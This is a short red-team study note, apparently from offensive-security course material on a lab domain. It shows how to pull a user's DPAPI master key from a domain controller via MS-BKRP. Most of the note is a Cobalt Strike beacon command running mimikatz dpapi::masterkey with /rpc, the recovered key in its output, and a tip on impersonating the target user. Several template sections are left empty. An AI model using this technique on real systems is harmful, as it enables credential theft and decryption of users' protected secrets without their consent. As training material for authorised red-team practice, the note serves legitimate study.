
To obtain the master key (without elevation or interaction with LSASS), is to request it from the domain controller via the Microsoft BackupKey Remote Protocol (MS-BKRP).

This is designed as a failsafe in case a user changes or forgets their password, and to support various smart card functionality.

## 🖊️ via Cobalt Strike

```
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

[domainkey] with RPC
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
  key : 8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
  sha1: 897f7bf129e6a898ff4e20e9789009d5385be1f3
```

⚠ This will only work if executed in the context of the user who owns the key.  If your Beacon is running as another user or SYSTEM, you must impersonate the target user somehow first, then execute the command using the `@` modifier.


## 📔 Description

- 

##  📗 Action to perform 


### ⚠ Opsec




### Properties
---
📆 created   {{18-02-2024}} 12:06
🏷️ tags: #redteam #crto 

---

